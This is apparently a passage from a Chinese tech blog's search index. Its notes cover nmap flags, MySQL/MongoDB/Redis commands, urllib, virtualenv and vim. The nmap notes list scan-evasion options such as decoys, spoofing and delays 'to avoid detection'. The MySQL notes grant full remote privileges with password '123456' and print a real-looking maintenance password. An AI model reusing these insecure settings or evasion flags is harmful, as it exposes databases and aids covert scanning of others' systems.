=> { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap参数简介]]></title>
    <url>%2Fposts%2Fc2379dd5%2F</url>
    <content type="text"><![CDATA[新学一个抓包工具 -&gt; tcpumptcpdmp -i eth0 -nn host 192.168.1.56 port 22 # 用nc连 nc 192.168.1.56 -t 22 # 点. 就是ack的意思 主机发现-iL # 指定文件 -iR 100 -p22 # 随机选择目标100个 的22端口 nmap 192.168.0.0/24 --exclude 192.168.0.1-100 # 不扫描后面的部分 -sL # 列出ip（相当于子网掩码的计算） -sN # 只ping -Pn #不做ping扫描，例如针对防火墙等安全产品， 防止：如果没有回包就不进行了 -PS/PA/PU/PY # 用syn，ack，udp， sctp 发现 -PE/PP/PM # 用echo， 时间戳，子网掩码 （一般没啥结果） -PO # ip协议的ping -n/ -R # 不做dns解析 / 做反向的解析 --dns-servers # 调用指定的dns服务器 --system-dns # 操作系统默认的dns，一般不用 --traceroute # 过程中进行raceroute 端口发现-sS/sT/sA/sW/sM # 默认的 syn扫描/tcp扫描,建立完整连接(最准确)/发送ack / 窗口扫描 / ack+fn -sU # udp扫描（准确性不怎么高） -sN/sF/sX # tcp的flag全为空 /只有fin/ fin,psh,urg --scanflag # 自定义flag （自己得懂原理） -sI # 僵尸扫描 -sY/sZ # sctp用 -sO # ip扫描 -b # ip中继 - -p # 指定端口(tcp与udp都扫), U: 53 -T:21 (分别指定tcp与udp的端口) 默认1000个 --exclude-ports # 指定端口中某一段 -F # 快速扫描(不会扫描100个全部端口) -r # 连续扫描(顺序) --top-ports # 扫排名前10个 --port-radio # 扫描更常见的端口(用处不大) 服务扫描-sV # 扫描这个端口跑的什么服务 --version-intensity # 0-9的扫描程度，9最详细 --version-light # 上面的等于2时 --version-all # 上面的等于9时 --version-trace # 将扫描过程进行跟踪 脚本扫描 （脚本目录:/usr/share/nmap/scripts/）-sC # 默认 --script=... # 指定脚本 --script-args= # 带参数 --script-args-file= --script-trace # 也可以trace --script-updatedb # 更新脚本 nmap --script-updatedb --script-help # 查看脚本的帮助 操作系统类型-O # 操作系统类型 --osscan-limit # 限制检测的系统类型 --osscan-guess 时间和性能-T # 指定间隔时间 -min-hostgroup/ -max-hostgroup # 最少一次扫描的主机数量 组 --min-parallelism/ --max-parallelism # 最少一次扫描的主机数量 --min-rtt-timeout/ --max-rtt-timeout/ --initial-rtt-timeout # 最小最大rtt --max-retries # --host-timeout # 超时时间 --scan-delay/ --max-scan-delay 10s # 延时时间(防止被发现) --min-rate # 发包最小速率 --max-rate 防火墙 和躲避-f # 最大传输mtu值 1500啥的 -D 192.168.0.2 192.168.0.3 192.168.0.4 # 伪造原地址(迷惑) -S # 伪造源地址 -e # 指定网卡 -g # 指定使用的源端口 --proxies &lt;url1, [url2]&gt; # 置地广代理服务器替我们发包 --data # 数据字段指定内容(必须是16进制) --data-string --data-length --ip-options --ttl --spoof-mac # 欺骗mac地址 --badsum # 发错的差错校验值 输出格式-oN / -oX / -oS /-oG # 正常格式/xml格式/../../ 杂项-6 # ipv6的 -A # 几个参数的组合（涵盖：-v, -O, --script, --trace） # trace路由追踪 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>nmap</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[远程连接mysql]]></title>
    <url>%2Fposts%2Fdfb14e5b%2F</url>
    <content type="text"><![CDATA[远程连接MySQL想要远程连接MySQL 那么必须是普通用户才行 不能是 root 用户 所以我们要先创建一个普通用户 创建普通用户 CREATE USER 'username'@'%' IDENTIFIED BY 'password'; 给普通用户赋权 GRANT ALL ON *.* TO 'username'@'%' 刷新系统权限相关表 FLUSH PRIVILEGES 以上三步执行的 创建用户 –&gt; 给创建的用户赋权 –&gt; 刷新 这样的话 可能还是不能完成MySQL的一个远程连接 这时候需要改变MySQL的一个默认配置 这配置文件位于/etc/mysql/mysql.conf.d/下的mysqld.cnf 里面有找到bind-address 把值127.0.0.1改为0.0.0.0然后接下来就是远程连接了 改完要记得重启MySQL服务 接下来就是远程连接MySQL首先要保证自己电脑装了MySQL才能远程连接 mysql -u username -p password -h ip地址 -P 端口号（一般默认是3306） 如果想要远程连接 首先要保证 本地安装了MySQL 才能远程连接 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql，数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql创建新用户并分配权限]]></title>
    <url>%2Fposts%2F4dcc830c%2F</url>
    <content type="text"><![CDATA[1、使用root用户登录mysql 2、添加具有本地(localhost/127.0.0.1)访问权限的用户 create user 'newuser'@'localhost' identified by 'password'; 3、创建具有远程访问权限的用户 create user 'newuser'@'%' identified by 'password'; 创建之后记得执行下面指令更新权限： flush privileges; 3、为新用户分配本地权限，可以指定数据库dbname和表名，可以用*替指所有。 grant all privileges on `dbname`.* to 'newuser'@'localhost' identified by 'password'; 4、为新用户分配远程权限，可以指定数据库dbname和表名，可以用*替指所有。 grant all privileges on `dbname`.* to 'newuser'@'%' identified by 'password'; 分配所有权限 &gt; grant all privileges on *.* to 'test'@'%' identified by '123456' 分配好之后之后记得执行下面指令更新权限： flush privileges; 5、如果还有问题，可以使用root账号登陆上去查询一下，再看看有没问题。 use mysql 6、查看user表 select Host, User, Password from user; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql表结构复制]]></title>
    <url>%2Fposts%2Ff0858aa6%2F</url>
    <content type="text"><![CDATA[复制结构：仿照student表结构复制一张new_student表,新表是空的： create table new_student like student; 复制数据：但是没主键，结构不重要： create table new_student2 as ( select * from student ); 复制表结构与数据，一模一样： insert into new_student3 select * from student; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql，数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu彻底卸载mysql并且重新安装]]></title>
    <url>%2Fposts%2Fb0669918%2F</url>
    <content type="text"><![CDATA[首先删除mysql: sudo apt-get remove mysql-* 然后清理残留的数据 dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P 它会跳出一个对话框，你选择yes就好了然后安装mysql sudo apt-get install mysql-client mysql-server 安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的检查mysql是不是在运行 sudo service mysql status 一般安装完成之后都是会自动运行的。如果没有运行你可以 sudo service mysql start 查看端口 sudo netstat -tap | grep mysql 运行它 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装mysql竟然没让你输入密码]]></title>
    <url>%2Fposts%2F136d9777%2F</url>
    <content type="text"><![CDATA[Mysql5.7这个版本的root密码在/etc/mysql/debian.cnf这个文件里面 使用sudo cat /etc/mysql/debian.cnf命令打开，你大概会看到如下内容，其中就包括Mysql的默认登陆名与密码 [client] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock [mysql_upgrade] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock 1、使用 mysql -u用户名 -p密码进行登陆， mysql -udebian-sys-maint -pM1WVft5X8S80rhE0 2、修改root用户密码 show databases； use mysql; update user set authentication_string=PASSWORD("密码") where user='root'; update user set plugin="mysql_native_password"; flush privileges; quit; 注:由于mysql5.7没有password字段，密码存储在authentication_string字段中 3、重新启动Mysql /etc/init.d/mysql restart 4、再次使用root用户登陆 登陆成功 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB简单的curd]]></title>
    <url>%2Fposts%2F589bc01a%2F</url>
    <content type="text"><![CDATA[集合创建：db.createCollection("test_col,",{capped:true, size:10}) # "test_col" 表名字(集合名字) # capped， 默认false，不设置上限，true设置上限 查看当前数据库的集合：show collections 删除集合：db.集合名称.drop() 查询：# 查找集合中所有的数据 db.collection_name.find() # 查询文档 # pretty() 方法以格式化的方式来显示所有文档 美观 db.collection_name.find().pretty() # 指定_id查找 db.collection_name.find({_id:1}).pretty() _id： 如果插入数据不给定id，他会自动创建，可以通过id查找文档 插入：# 向集合插入文档 db.collection_name.insert(document) 例子：db.col_test.insert({name:'xx', gender:'nan'}) （在集合不创建的时候也可以，集合会自动被创建） 更新：db.collection_name.update({}) # 更新文档 db.collection_name.update({'count':88},{$set:{'count':89}}) # count 由88变成89，只会作用于第一条数据 例子：db.集合名称.update({name:'xx'}, {$set:{'name':'xps'}}, {multi:true}) 将name为xx的改为yy， multi多行，默认false，只作用于第一个，为true时修改多条 # 更新多行，这个3.2的版本才支持 db.col_name.updateMany() 删除：db.collection_name.remove({}) # 删除集合所有文档 全部删除 db.集合名称.remove({gender:'nan', {justone:true}}) # 依据条件删除一条 justone默认false，删除多条 #删除多条3.2版本才有 db.col_name.deleteMany() # 删除集合 db.col_name.drop() 保存 （如果集合不存在，则执行添加操作）db.集合名称.save(document) 数据类型object ID 文档ID （不会重复，12字节的16进制数） String 字符串 Boolean 存储一个布尔值 Integer 整数 Double 浮点值 Arrays 数组或列表 Object 用于嵌入式的文档，即一个值为一个文档 Null 存储NUll值 Times tamp 时间戳 Data 当前日期活时间的UNIX时间格式 object ID ： （不会重复，12字节的16进制数，前4当前时间，…) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis基础]]></title>
    <url>%2Fposts%2F78b568c7%2F</url>
    <content type="text"><![CDATA[在Ubuntu系统中默认配置文件地址: /etc/redis/redis.conf port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli # 进入数据库 redis-cli # 退出 exit 基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 # 查看帮助 help @sorted_set String:字符串string是redis最基本的类型，一个key对应一个value。 # 设置值 SET key value # 得到值 GET key # 将key的值设置为新的，并返回旧的值 GETSET key value_new # 设置多个键值 MSET name xps sex nan #取出多个键的值 MGET name sex # 获取key的值的长度 STRLEN name # 将该值追加到name的值xps的后面 APPEND name ppp # 设置持续时间 SETEX name 10 xps # 如果该key有值就不执行 SET name xxx # 每次执行将value的数字加1 set age 10 INCR age # 每次执行将value的数字减1 DECR age 全局Key操作：keys * # 查看所有的键 DEL key EXISTS key RENAME old_key new_key TYPE key Hash:哈希（字段里面也有值）Hashes类型看成具有String Key和String Value的map容器。 类似于这种结构： b = { one:xps two:xp three:x } # 设置该key字段的值 HSET key field value HSET b one xps HSET b one xps two xp three x # 获取该key字段的值 HGET key field HGET b one # 获取hash表里面所有的值 HVALS key Hvals b # 获取hash表里面所有的字段 Hkeys b # 获取hash表中的字段数量 HLEN b List类型（例如：微博评论）List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 # 向列表头部插入数据（顺序：c,b,a） LPUSH names a b c # 插入数据（x,y,z） RPUSh names2 x y z # 获取列表里面某个索引对应的值 LINDEX key index LINDEX names 0 # 弹出并删除最后一个元素 RPOP names # 弹出并删除最前面一个元素 LPOP names # 列表的长度 LLEN key # LSET key index value Set类型(微博粉丝，关注人)Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 # 向集合添加成员 SADD setkey a b c d # 查看集合成员数量 SCARD key # 迭代集合中的所有元素 SMEMBERS key SMEMBERS setkey # 判断集合是否存在该元素(存在为1，不存在为0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey Sorted Set类型（排行榜，top,直播）每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 # 向有序集合添加成员，并且给他权重 ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # 显示集合成员数 ZCARD zkey # 计算有序集合指定区的分数的成员数 ZCOUNT zkey 1 3 # 移除有序集合一个或多个成员 ZREM zkey number # 查找 迭代有序集合所有元素 ZSCAN zkeys ### document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis常用命令]]></title>
    <url>%2Fposts%2Fc3982ec0%2F</url>
    <content type="text"><![CDATA[在Ubuntu系统中默认配置文件地址: /etc/redis/redis.conf port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli # 进入数据库 redis-cli # 退出 exit 基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 # 查看帮助 help @sorted_set String:字符串string是redis最基本的类型，一个key对应一个value。 # 设置值 SET key value # 得到值 GET key # 将key的值设置为新的，并返回旧的值 GETSET key value_new # 设置多个键值 MSET name xps sex nan #取出多个键的值 MGET name sex # 获取key的值的长度 STRLEN name # 将该值追加到name的值xps的后面 APPEND name ppp # 设置持续时间 SETEX name 10 xps # 如果该key有值就不执行 SET name xxx # 每次执行将value的数字加1 set age 10 INCR age # 每次执行将value的数字减1 DECR age 全局Key操作：keys * # 查看所有的键 DEL key EXISTS key RENAME old_key new_key TYPE key Hash:哈希（字段里面也有值）Hashes类型看成具有String Key和String Value的map容器。 类似于这种结构： b = { one:xps two:xp three:x } # 设置该key字段的值 HSET key field value HSET b one xps HSET b one xps two xp three x # 获取该key字段的值 HGET key field HGET b one # 获取hash表里面所有的值 HVALS key Hvals b # 获取hash表里面所有的字段 Hkeys b # 获取hash表中的字段数量 HLEN b List类型（例如：微博评论）List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 # 向列表头部插入数据（顺序：c,b,a） LPUSH names a b c # 插入数据（x,y,z） RPUSh names2 x y z # 获取列表里面某个索引对应的值 LINDEX key index LINDEX names 0 # 弹出并删除最后一个元素 RPOP names # 弹出并删除最前面一个元素 LPOP names # 列表的长度 LLEN key # LSET key index value Set类型(微博粉丝，关注人)Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 # 向集合添加成员 SADD setkey a b c d # 查看集合成员数量 SCARD key # 迭代集合中的所有元素 SMEMBERS key SMEMBERS setkey # 判断集合是否存在该元素(存在为1，不存在为0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey Sorted Set类型（排行榜，top,直播）每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 # 向有序集合添加成员，并且给他权重 ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # 显示集合成员数 ZCARD zkey # 计算有序集合指定区的分数的成员数 ZCOUNT zkey 1 3 # 移除有序集合一个或多个成员 ZREM zkey number # 查找 迭代有序集合所有元素 ZSCAN zkeys ### document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[urllib库的基本使用]]></title>
    <url>%2Fposts%2F8045626e%2F</url>
    <content type="text"><![CDATA[urllib是Python自带的标准库，无需安装，直接可以用。 提供了如下功能： 网页请求 响应获取 代理和cookie设置 异常处理 URL解析 爬虫所需要的功能，基本上在urllib中都能找到，学习这个标准库，可以更加深入的理解后面更加便利的requests库。 urllib库 urlopen 语法 urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None) #url:访问的网址 #data:额外的数据，如header，form data 用法 # request:GET import urllib.request response = urllib.request.urlopen('http://www.baidu.com') print(response.read().decode('utf-8')) # request: POST # http测试：http://httpbin.org/ import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({'word':'hello'}),encoding='utf8') response = urllib.request.urlopen('http://httpbin.org/post',data=data) print(response.read()) # 超时设置 import urllib.request response = urllib.request.urlopen('http://httpbin.org/get',timeout=1) print(response.read()) import socket import urllib.request import urllib.error try: response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason,socket.timeout): print('TIME OUT') 响应 # 响应类型 import urllib.open response = urllib.request.urlopen('https:///www.python.org') print(type(response)) # 状态码， 响应头 import urllib.request response = urllib.request.urlopen('https://www.python.org') print(response.status) print(response.getheaders()) # 获取响应头 print(response.getheader('Server')) # 得到指定的响应头 Request 声明一个request对象，该对象可以包括header等信息，然后用urlopen打开。 # 简单例子 import urllib.request request = urllib.request.Requests('https://python.org') response = urllib.request.urlopen(request) print(response.read().decode('utf-8')) # 增加header from urllib import request, parse url = 'http://httpbin.org/post' headers = { 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36' 'Host':'httpbin.org' } # 构造POST表格 dict = { 'name':'Germey' } data = bytes(parse.urlencode(dict),encoding='utf8') req = request.Request(url=url,data=data,headers=headers,method='POST') response = request.urlopen(req) print(response.read()).decode('utf-8') # 或者随后增加header from urllib import request, parse url = 'http://httpbin.org/post' dict = { 'name':'Germey' } req = request.Request(url=url,data=data,method='POST') req.add_hader('User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36') response = request.urlopen(req) print(response.read().decode('utf-8')) Handler：处理更加复杂的页面 代理 import urllib.request proxy_handler = urllib.request.ProxyHandler({ 'http':'http://127.0.0.1:9743' 'https':'https://127.0.0.1.9743' }) opener = urllib.request.build_openner(proxy_handler) response = opener.open('http://www.baidu.com') print(response.read()) Cookie:客户端用于记录用户身份,维持登录信息 import http.cookiejar, urllib.request cookie = http.cookiejar.CookieJar() handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") for item in cookie: print(item.name+"="+item.value) # 保存cooki为文本 import http.cookiejar, urllib.request filename = "cookie.txt" # 保存类型有很多种 ## 类型1 cookie = http.cookiejar.MozillaCookieJar(filename) ## 类型2 cookie = http.cookiejar.LWPCookieJar(filename) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") # 使用相应的方法读取 import http.cookiejar, urllib.request cookie = http.cookiejar.LWPCookieJar() cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") 异常处理 捕获异常，保证程序稳定运行 # 访问不存在的页面 from urllib import request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.URLError as e: print(e.reason) # 先捕获子类错误 from urllib imort request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.HTTPError as e: print(e.reason, e.code, e.headers, sep='\n') except error.URLError as e: print(e.reason) else: print("Request Successfully') # 判断原因 import socket import urllib.request import urllib.error try: response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason, socket.timeout): print('TIME OUT') URL解析 主要是一个工具模块，可用于为爬虫提供URL。 urlparse:拆分URL urlib.parse.urlparse(urlstring,scheme='', allow_fragments=True) # scheme: 协议类型 # 是否忽略’#‘部分 举个例子 from urllib import urlparse result = urlparse("https://edu.hellobi.com/course/157/play/lesson/2580") result ##ParseResult(scheme='https', netloc='edu.hellobi.com', path='/course/157/play/lesson/2580', params='', query='', fragment='') urlunparse:拼接URL，为urlparse的反向操作 from urllib.parse import urlunparse data = ['http','www.baidu.com','index.html','user','a=6','comment'] print(urlunparse(data)) urljoin:拼接两个URL urljoin urlencode:字典对象转换成GET请求对象 from urllib.parse import urlencode params = { 'name':'germey', 'age': 22 } base_url = 'http://www.baidu.com?' url = base_url + urlencode(params) print(url) 最后还有一个robotparse，解析网站允许爬取的部分。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
        <tag>urllib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[virtualenv]]></title>
    <url>%2Fposts%2F9c06d95c%2F</url>
    <content type="text"><![CDATA[注意： # 腾讯云的源有时候不行，可以更换源 pip3 install virtualenv -i https://pypi.doubanio.com/simple/ --user 搭建虚拟环境 先安装 virtualenv, 再安装 virtualenvwrapperpip install virtaulenv pip install virtualenvwrapper 设置虚拟的环境变量 . 先找到 virtualenvwrapper.sh 文件find / -name "virtualenvwrapper.sh" 写入 .bashrc 文件export WORKON_HOME=$HOME/.virtualenvs source 这里写起前面找出来的文件 基本命令 # 创建虚拟环境 mkvirtualenv pyenv # 删除虚拟机环境 rmvirtualenv pyenv # 进入虚拟环境 workon pyenv # 推出虚拟环境 deactivate # 创建虚拟环境的是时候，指定 Python 版本 mkvirtualenv 如果报如下错误： ERROR: virtualenvwrapper could not find virtualenv in your path 因为是被安装在默认的Python目录下，添加软链接即可 ln -s /usr/bin/python36/bin/virtualenv /usr/local/bin/virtualenv 批处理安装库：requirements.txtpip freeze 冻结出所有包与版本号 导出：pip freeze &gt; requirements.txt 再安装: pip install -r requirements.txt 虚拟环境： windows激活虚拟环境 ：pycharm自动激活 cd 虚拟环境目录venv/Scripts/ active linux激活虚拟环境 ：source ./venv/bin/active document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>virtualenv</tag>
        <tag>虚拟环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim基本命令]]></title>
    <url>%2Fposts%2F17b23787%2F</url>
    <content type="text"><![CDATA[三种模式: 一般命令模式(默认,按住esc进入) 命令模式 编辑模式 h 左 j 下 l 右 k 上 w 移动到下一个单词词首 e 移动到下一个单词词尾 b 移动到上一个单词词首 2.进入插入模式 i 在当前光标出处编辑 I 大写的i 在行首插入 A 在行末插入 a 在光标后插入编辑 o 在当前行后插入一个新行 O 在当前行前插入一个新行 cw 替换从光标所在位置后到一个单词结尾的字符 3.1命令行模式下退出vim 命令 说明 :q! 强制退出，不保存 :q 退出 :wq! 强制保存并退出 :w &lt;文件路径&gt; 另存为 :saveas 文件路径 另存为 :x 保存并退出 :wq 保存并退出 3.2普通模式下退出vim普通模式下输入Shift+zz即可保存退出vim 4. 普通模式下删除vim文本信息进入普通模式，使用下列命令可以进行文本快速删除： 命令 说明 x 删除游标所在的字符 X 删除游标所在前一个字符 Delete 同x dd 删除整行 dw 删除一个单词（不适用中文） d$或D 删除至行尾 d^ 删除至行首 dG 删除到文档结尾处 d1G 删至文档首部 除此之外，你还可以在命令之前加上数字，表示一次删除多行，如： 2dd表示一次删除2行 2.1.1 重复执行上次命令在普通模式下.(小数点)表示重复上一次的命令操作 普通模式下输入x，删除第一个字符，输入.(小数点)会再次删除一个字符，除此之外也可以重复dd的删除操作 2.1.2 执行指定次数相同的命令进入普通模式输入N&lt;command&gt;，N 表示重复后面的次数，下面来练习： 打开文件文件进行编辑 $ vim protocols 下面你可以依次进行如下操作练习： 输入10x，删除10个连续字符 输入3dd，将会删除3行文本 在普通模式下，你还可以使用dw或者daw(delete a word)删除一个单词，所以你可以很容易的联想到dnw(n替换为相应数字) 表示删除n个单词 2.2.1 行间跳转 命令 说明 nG(n Shift+g) 游标移动到第 n 行(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号) gg 游标移动到到第一行 G(Shift+g) 到最后一行 你在完成依次跳转后，可以使用 Ctrl+o 快速回到上一次(跳转前)光标所在位置,这个技巧很实用，比如当你在写代码时，忽然想起有个 bug，需要修改，这时候你跳过去改好了，只需要按下 Ctrl+o 就可以回到你之前的位置。vim 中会用很多类似的小技巧就等着你去发掘。 2.2.2 行内跳转普通模式下使用下列命令在行内按照单词为单位进行跳转 命令 说明 w 到下一个单词的开头 e 到当前单词的结尾 b 到前一个单词的开头 ge 到前一个单词的结尾 0或^ 到行头 $ 到行尾 f&lt;字母&gt; 向后搜索&lt;字母&gt;并跳转到第一个匹配的位置(非常实用) F&lt;字母&gt; 向前搜索&lt;字母&gt;并跳转到第一个匹配的位置 t&lt;字母&gt; 向后搜索&lt;字母&gt;并跳转到第一个匹配位置之前的一个字母(不常用) T&lt;字母&gt; 向前搜索&lt;字母&gt;并跳转到第一个匹配位置之后的一个字母(不常用) 使用 ~ 将游标所在字母变成大写或小写 2.3.1 复制及粘贴文本 普通模式中使用y复制 普通模式中，yy复制游标所在的整行（3yy表示复制3行） 普通模式中，y^ 复制至行首，或y0。不含光标所在处字符。 普通模式中，y$ 复制至行尾。含光标所在处字符。 普通模式中，yw 复制一个单词。 普通模式中，y2w 复制两个单词。 普通模式中，yG 复制至文本末。 普通模式中，y1G 复制至文本开头。 普通模式中使用 p 粘贴 普通模式中，p(小写)代表粘贴至光标后（下） 普通模式中，P(大写)代表粘贴至光标前（上） 2.3.2 剪切及粘贴其实前面讲得 dd 删除命令就是剪切，你每次 dd 删除文档内容后，便可以使用 p 来粘贴，也这一点可以让我们实现一个很爽快的功能——交换上下行： ddp ,就这么简单，即实现了快速交换光标所在行与它下面的行 2.1.1 替换和撤销(Undo)命令替换和Undo命令都是针对普通模式下的操作 命令 说明 r+&lt;待替换字母&gt; 将游标所在字母替换为指定字母 R 连续替换，直到按下Esc cc 替换整行，即删除游标所在行，并进入插入模式 cw 替换一个单词，即删除一个单词，并进入插入模式 C(大写) 